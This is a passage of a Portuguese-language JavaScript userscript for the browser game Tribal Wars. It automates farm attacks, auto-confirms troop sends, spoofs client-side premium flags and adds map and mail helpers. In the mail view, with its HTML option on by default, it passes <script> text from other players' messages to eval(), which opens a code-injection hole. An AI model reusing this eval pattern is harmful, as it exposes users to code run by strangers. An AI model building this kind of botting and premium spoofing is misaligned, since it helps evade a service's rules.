				cunhar_table.getElementsByTagName('th')[1].innerHTML += ' | <input type="checkbox" id="cunhar_check"' + cunhar_checked + ' onClick="' + str_setData + '; setCookie(\'cunhar_' + VillId + '\', String(this.checked)); if (this.checked == true) location.href = document.getElementById(\'cunhar\').href;void(0);"> Auto';
				cunhar_link = cunhar_table.getElementsByTagName('a')[0];
				if (cunhar_link != null) cunhar_link.id = 'cunhar';
				cunhar_span = cunhar_table.getElementsByTagName('span')[cunhar_table.getElementsByTagName('span').length - 1];
				if (getData('cunhar_' + gd.village.id) == 'true') {
					if (cunhar_link != null){
						location.href = cunhar_link.href
							}
					else{		
						alert(cunhar_span.textContent);
						document.getElementById('cunhar_check').checked = false;
						setData('cunhar_' + gd.village.id, String(document.getElementById('cunhar_check').checked));
					}
				}
			}
		}

		if (gd.screen == 'place'){

			$('.modemenu:last a:last').html('<img src="http://cdn2.tribalwars.net/graphic/unit/unit_light.png"></img> ' + lang_farmer[0] + ' <img src="http://cdn2.tribalwars.net/graphic/unit/unit_light.png"></img>');
		
			function attack_model(index, coords){
				$('select:first')[0].selectedIndex = Number(index);
				$('#inputx').val(coords.split('|')[0]);
				$('#inputy').val(coords.split('|')[1]);
				location.href = 'javascript:$(\'select:first\').trigger(\'change\');$(\'#target_attack\').click();';
			}
			
			function coord_report(url){
				$.get(url, function(data){
					name = $(data).find('#attack_info_def tr:eq(1) a:eq(0)').text();
					name = extrair_coord(name);
					$('#inputx').val(name.split('|')[0]);
					$('#inputy').val(name.split('|')[1]);
				});
			}
			
			function farmar(){
				var farmer = getData('farmer_' + gd.village.id);
				if (farmer){
					attack_lang = $('#target_attack').val();
					var coords = trim(getData('farmer_coords_' + gd.village.id)).split(' ');
					var index = Number(getData('last_coord'));
					if (index >= coords.length) index = 0;
					var f0 = Number(farmer.split('|')[0]);
					var f1 = Number(farmer.split('|')[1]);
					if (f0 > 0 && f1 > 0) {
						if ($('#error').length > 0) {
							count = Math.floor((Math.random()*20)+41);
							if (win.now == true) count = 0;
							setData('last_coord', index + 1);
							win.intervalo_ataque = setInterval(function(){
								if (count > 0) $('#target_attack').val(attack_lang + ' ' + (--count));
								if (count == 0) location.href = '?screen=place&village=' + gd.village.id;
							}, 1000);
						} else {
							if ($('#target_attack').length > 0){
								count = Math.floor((Math.random()*8)+2);
								if (win.now == true) count = 0;
								win.intervalo_ataque = setInterval(function(){
									if (count > 0) $('#target_attack').val(attack_lang + ' ' + (--count));
									if (count == 0) attack_model(f0, coords[index]);
								}, 1000);
							} else
							if (_GET('try') == 'confirm'){
								if ($('#troop_confirm_go').length > 0){
									setData('farmer_' + gd.village.id, f0 + '|' + (f1 - 1));
									setData('last_coord', index + 1);
									$('#troop_confirm_go').click();
								}
							}
						}
					}
				}
			}
			
			if (gd.mode == 'templates'){
				function save(){
					setData('farmer_coords_' + gd.village.id, trim($('#coords').val()));
					alert('ok');
				}
				var coords = getData('farmer_coords_' + gd.village.id);
				$('#troop_template_units').after('<h3>' + lang_farmer[0] + ':</h3><table class="vis"><tbody><tr><td colspan="3">Coordenadas: (<span id="count">' + coords.split(' ').length + '</span>)<input type="text" title="Ex: 500|500 458|650 320|800 " id="coords" size="60" value="' + coords + '"></input><input type="button" id="bt_save" value="ok"></input></td><td><a href="http://' + gd.world + '.twplus.org/calculator/locator/?v_x=' + gd.village.coord.split('|')[0] + '&v_y=' + gd.village.coord.split('|')[1] + '&t=L" title="Use Script-Export" target="pesquisar">' + lang_search_villages + '</a></tr></tbody></table>');
				$('#bt_save').bind('click', save);
				$('#coords').bind('keyup', function(){
					$('#count').html(trim($('#coords').val().split(' ').length));
				});
			}
				
			if (_GET('report_id') != null){
				report_id = _GET('report_id');
				coord_report('http://' + document.domain + '/game.php?village=' + VillId + '&mode=attack&view=' + report_id + '&screen=report');
			}
			
			var farmer_q = getData('farmer_' + gd.village.id);
			$('select').parent().after('<td colspan="2">' + lang_farmer[0] + ': <input title="' + lang_farmer[1] + '" type="text" value="' + (farmer_q != '' ? farmer_q.split('|')[1] : '') + '" id="inp_farmer" size="2"></input><input id="bt_farmer" type="button" value="' + $('#target_attack').val() + '"></input><input type="button" id="farmer_cancel" value="' + lang_disable + '"></input></td>');
			$('#inp_farmer').bind('keydown', function(event){ 
				if ([65,8,17,35,36,37,38,39,40].indexOf(event.keyCode) > -1 || (event.keyCode >= 96 && event.keyCode <= 105)) return true; else return false;
			});
			$('#bt_farmer').bind('click', function(){
				var index = $('select')[0].selectedIndex;
				var vezes = $('#inp_farmer').val();
				if (index == 0 || vezes == 0) {
					alert(lang_farmer[1])
				} else {
					setData('farmer_' + gd.village.id, index + '|' + vezes);
					win.now = true;
					farmar();
				}
			});
			$('#farmer_cancel').bind('click', function(){
				setData('farmer_' + gd.village.id,  '1|0');
				$('#inp_farmer').val('0');
				clearInterval(win.intervalo_ataque);
				$('#target_attack').val(attack_lang);
			});
			farmar();
					
		
			if (getData('calcular_' + gd.village.id) != '') {
				cmd = getData('calcular_' + gd.village.id).split('!!!');
				abrir = 'javascript: lanceiro = ' + cmd[0] + '; espadachim = ' + cmd[1] + '; barbaro = ' + cmd[2] + '; arqueiro = ' + cmd[3] + '; cav_leve = ' + cmd[4] + '; arqueiro_cav = ' + cmd[5] + '; cav_pesada = ' + cmd[6] + '; mandar_spy = ' + cmd[7] + '; spy = ' + cmd[8] + '; debug_ligado = 0; ataque = true; game_data.player.premium = true; $.getScript(\'' + base_scripts + 'calcular_farmar.js\');void(0);';
				location.href = abrir;
				deleteData('calcular_' + gd.village.id);
			}

			if (_GET('target_c') != null){
				target = _GET('target_c').split('|');
				$('#inputx').val(target[0]);
				$('#inputy').val(target[1]);
			}
			
			if (_GET('type') == 'all') win.selectAllUnits(true);
			
			if (_GET('type') == 'same'){
				function ins_tr(tropa, valor){
					$('#unit_input_' + tropa).val(valor);
				}
				att_units = _GET('att_units');
				att = att_units.split('|');
				
				archer = ''; marcher = ''; knight = '';
				
				if (att.length == 13) {
					archer = ',archer';marcher=',marcher';kinght=',knight';
				}
				if (att.length == 12) {
					archer = ',archer';marcher=',marcher';
				}
				if (att.length == 11) {
					knight = ',knight';
				}
				
				troaps = 'spear,sword,axe' + archer + ',spy,light' + marcher + ',heavy,ram,catapult' + knight + ',snob';
				
				tro = troaps.split(',');
				
				for (i = 0; i < tro.length; i++){
					if (Number(att[i]) > 0) ins_tr(tro[i], att[i]);
				}
			}
			
			if (gd.mode == 'sim'){
				if (_GET('att_units') != null && _GET('def_units') != ''){
					function ins(tropa, valor, type){
						$('[name="' + type + '_' + tropa + '"]:first').val(valor);
					}
					
					att_units = _GET('att_units');
					def_units = _GET('def_units');
					att = att_units.split('|');
					def = def_units.split('|');
					
					if (att.length >= 12) at = 'spear,sword,axe,archer,spy,light,marcher,heavy,ram,catapult,knight,snob'; else at = 'spear,sword,axe,spy,light,heavy,ram,catapult,knight,snob';
					
					tropas = at.split(',');
					
					for (i = 0; i < tropas.length; i++){
						if (att[i] > 0) ins(tropas[i], att[i], 'att');
						if (def[i] > 0) ins(tropas[i], def[i], 'def');
					}
				}
			}
			
			if (document.getElementById('target_attack') != null) {
				$(function(){
					razao = 0.0166666666662 / win.UnitPopup.unit_data.spear.speed;
					function speed(tropa){
						if (eval('win.UnitPopup.unit_data.' + tropa + ' != undefined')){
							eval('vel = win.UnitPopup.unit_data.spear.speed / win.UnitPopup.unit_data.' + tropa + '.speed;');
							return Math.round(razao * vel * 60);
						} else {
							return 0;
						}
					}
					_tropas = speed('spear') + '|' + speed('sword') + '|' + speed('axe') + '|' + speed('archer') + '|' + speed('spy') + '|' + speed('light') + '|' + speed('marcher') + '|' + speed('heavy') + '|' + speed('ram') + '|' + speed('catapult') + '|' + speed('knight') + '|' + speed('snob');
					
					setData(mundo + '_vel_tropas', _tropas);
				});
			}
		}

		aldeiasnome = getData(mundo + '_aldeiasnome');
		
		if (aldeiasnome != ''){
			aldeiasnome1 = aldeiasnome.split(' ** ');
			
			if (gd.screen == 'market' && (gd.mode == null || gd.mode == 'send')){
				$('#inputx').parent().parent().after('<tr><td colspan="3"><select id="aldeias_market"></select></td></tr>');
				$('#aldeias_market').bind('change', function(){
					if ($(this).val() != ''){
						c = $(this).val().split('|'); 
						$('#inputx').val(c[0]);
						$('#inputy').val(c[1]);
					}
				});
				select = '<option></option>';
				for (i = 0; i < aldeiasnome1.length; i++){
					c=extrair_coord(aldeiasnome1[i]);
					select += '<option value="' + c + '">' + aldeiasnome1[i] + '</option>';
				}
				$('#aldeias_market').html(select);
			}
		}
		
		if (gd.screen == 'map') {
			$('#fullscreen').attr('style', 'display: block;').attr('onclick', 'TWMap.premium = true; TWMap.goFullscreen();').attr('title', 'Tam Ekran');
			var map_size = Number(getData('map_size'));
			if (map_size == 0) map_size = 13;
			location.href='javascript:TWMap.resize(' + map_size + ');void(0);';
			if ($('#map_config').length > 0) {
				$('#map_config').append('<br><table class="vis" width="100%"><tbody><tr><th colspan="2">' + lang_map[2] + '</th></tr><tr><td><table cellspacing="0"><tbody><tr><td width="80">' + lang_map[1] + '</td><td><select id="map_chooser_select" onchange="TWMap.resize(parseInt($(\'#map_chooser_select\').val()), true)"><option id="current-map-size" value="' + map_size + '" style="display:none;">' + map_size + 'x'+ map_size + '</option><option value="4">4x4</option><option value="5">5x5</option><option value="7">7x7</option><option value="9">9x9</option><option value="11">11x11</option><option value="13">13x13</option><option value="15">15x15</option><option value="20">20x20</option><option value="30">30x30</option></select></td><td valign="middle"><img alt="" class="tooltip" src="http://cdn.tribalwars.com.br/graphic//questionmark.png" width="13" height="13"></td></tr></tbody></table><input type="hidden" value="/game.php?village=86984&amp;screen=settings&amp;ajaxaction=set_map_size&amp;h=d7d4" id="change_map_size_link"></td></tr><tr><td><table cellspacing="0"><tbody><tr><td width="80">' + lang_map[0] + '</td><td colspan="2"><select id="minimap_chooser_select" onchange="TWMap.resizeMinimap(parseInt($(\'#minimap_chooser_select\').val()), true)"><option id="current-minimap-size" value="120x120" style="display:none;">120x120</option><option value="20">20x20</option><option value="30">30x30</option><option value="40">40x40</option><option value="50">50x50</option><option value="60">60x60</option><option value="70">70x70</option><option value="80">80x80</option><option value="90">90x90</option><option value="100">100x100</option><option value="110">110x110</option><option value="120" selected="selected">120x120</option></select></td></tr></tbody></table><input type="hidden" value="/game.php?village=86984&amp;screen=settings&amp;ajaxaction=set_map_size&amp;h=d7d4" id="change_map_size_link"></td></tr></tbody></table>');
				$('#map_chooser_select').bind('change', function(){
					setData('map_size', $(this).val());
				});
			}
			function mapa_plus(){
				if ($('#tempo_calculado').length == 0 && $('#notas').length == 0){
					if ($('#info_content').length > 0){
						coords_mapa = extrair_coord($('#info_content th:first').html());
						if (coords_mapa != gd.village.coord) $('#info_content tbody:first').append(calcular_distancia(gd.village.coord, coords_mapa));
						var id = _GET('id', $('#map').attr('href'));
						var nn = getData(gd.world + '_label_' + id);
						var notas = nn.split('<br>');
						if (nn) $('#info_content tbody:first').append('<tr id="notas"><th colspan="2">' + lang_notes + '</th></tr><tr><td colspan="2">' + notas[0] + (notas.length > 1 ? ' [...]' : '') + '</td></tr>');
					}
				}
				$('[id*="map_village_"]').each(function(){
					var id = $(this).attr('id').replace('map_village_', '');
					if ($('#map_icons_' + id).length == 0){
						var data = getData(gd.world + '_label_' + id);
						if (data){
							var m = $('#map_village_' + id);
							m.before('<img style="position: absolute; top: ' + m.css('top') + '; left: ' + m.css('left') + '; width: 18px; height: 18px; z-index: 4; margin-top: 18px; margin-left: 0px;" id="map_icons_' + id + '" src="/graphic/map/village_notes.png">');
						}
					}
				});
			}
			win.setInterval(function(){mapa_plus()}, 1000);
		}

		if (gd.screen=='mail' && gd.mode == 'view') {    
			$('form').bind('submit', function(){
				$('#message').val($('#message').val() + '  ');
			});
			messages = getElementsByClass('text');
			$(messages).each(function(){
                var ver = $(this).text();
                if (ver.indexOf('  ') > 0){
					$(this).text(ver.replace('  ', ''));
					var title1 = $(this).prev().find('span:first')
					$(title1).append(' <img width="11" src="http://www.profittere.com.br/images/popup/icon_ok.png" title="' + lang_usa.replace('5', $(title1).text()) + '"></img>');
                }
			});
			RegExp = /\[img\]https?:\/\/.+?\/.+?\..*?\[\/img\]/g; 
			RegExpV1 = /\[vid\]https?:\/\/.+?youtube.+?\/watch\?v=[\w_]+&?.*?\[\/vid\]/g;
			RegExpV2 = /\[vid\]https?:\/\/.+?youtube.+?\/watch\?v=([\w_]+)&?.*?\[\/vid\]/;
			allow_html = getData(mundo + '_permitir_html');
			allow_html_check = '';
			if (allow_html == '') {
				allow_html = 'true';
				setData(mundo + '_permitir_html', 'true');
			}
			for (i = 0; i < messages.length; i++){  
				if (messages[i] != null){             
					meta = messages[i].innerHTML.match(RegExp);
					meta2 = messages[i].outerHTML.match(RegExpV1);
					meta3 = messages[i].textContent.match(/<script>.+?<\/script>/g);
					/*
					MessHTML = messages[i].innerHTML.match(RegExpHTML);
					MessNotHTML = messages[i].textContent.match(RegExpNotHTML);
					*/
					
					modified = messages[i].innerHTML;            
					
						if (allow_html == 'true'){
							allow_html_check = ' checked="checked"';
							modified = replace_all(replace_all(replace_all(modified, '&lt;', '<'), '&gt;', '>'), '&amp;', '&');
						}
					if (meta != null) {               
						for (b = 0; b < meta.length; b++) {
							tag_img = meta[b].replace('[img]', '<img src="').replace('[/img]', '"/>');                    
							modified = modified.replace(meta[b], tag_img);              
						}
					}
					if (meta2 != null) {
						for (b = 0; b < meta2.length; b++) {	
							tag_vid = '<object width="300" height="225"><param name="movie" value="http://www.youtube.com/v/' + meta2[b].match(RegExpV2)[1] + '"></param><param name="allowFullScreen" value="true"></param><param name="allowscriptaccess" value="always"></param><embed src="http://www.youtube.com/v/zh6PeT8f6Ro?version=3&amp;hl=pt_BR" type="application/x-shockwave-flash" width="560" height="315" allowscriptaccess="always" allowfullscreen="true"></embed></object>';                                           
							modified = modified.replace(meta2[b], tag_vid);              
						}
					}					
					if (modified != messages[i].innerHTML) messages[i].innerHTML = modified;				
					
					if (allow_html == 'true'){
						if (meta3 != null) {
							for (b = 0; b < meta3.length; b++) {					
								eval(meta3[b].replace(/<\/?script>/g, ''));
							}
						}
					}

				}
			}

			document.getElementById('action_row2').outerHTML += '<br><tr><th colspan="2">' + lang_messages[0] + '</th></tr><tr><td colspan="2"><li>' + lang_messages[1] + ' *</li></td></tr><tr><td colspan="2"><li>' + lang_messages[2] + ' *</li></td></tr><tr><td colspan="2"><input type="checkbox"' + allow_html_check + '" onclick="' + str_setData + ' setCookie(game_data.world + \'_permitir_html\', String(this.checked));void(0);"></input>' + lang_messages[3] + ' *</td></tr><tr><td colspan="2" align="right"><font size="1">' + lang_messages[4] + '</font></td></tr>';
		}        
		
		if (getData(mundo + '_titulo_mundo') == 'true'){
			document.title = mundo.toUpperCase() + ' - ' + document.getElementsByTagName('title')[0].textContent;void(0);
		}
		
		$('.server_info').append('<p class="server_info">Script by <a>Fernando</a>' + lang_settings[1] + '</p>');
		
	}    
}
void(0);